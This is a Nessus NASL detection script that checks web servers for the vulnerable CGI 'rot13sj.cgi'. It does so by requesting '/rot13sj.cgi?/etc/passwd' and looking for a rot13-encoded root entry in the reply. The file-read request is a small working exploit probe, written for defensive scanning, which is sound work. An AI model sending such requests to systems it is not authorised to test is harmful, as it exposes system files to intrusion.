#
# (C) Renaud Deraison
#
#
# Ref: http://www.geocities.com/sjefferson101010/
#

if(description)
{
  script_id(11684);
  script_version ("$Revision: 1.5 $");
  name["english"] = "rot13sj.cgi";

  script_name(english:name["english"]);
  desc["english"] = "
The remote host is running the CGI 'rot13sj.cgi'. This CGI
contains various flaws which may allow a user to execute 
arbitrary commands on this host and to read aribrary files.

Solution : Delete it
Risk factor : High";

  

 script_description(english:desc["english"]);

 summary["english"] = "Checks for rot13sj.cgi";

 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);  

 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");

 family["english"] = "CGI abuses";

 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (make_list(cgi_dirs()))
{ 
 req = http_get(item:dir + "/rot13sj.cgi?/etc/passwd", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 
 #
 # Every file is rot13-encoded
 #
 if(egrep(pattern:"ebbg:.*:0:[01]:.*", string:res))
 {
  security_hole(port);
  exit(0);
 }
}
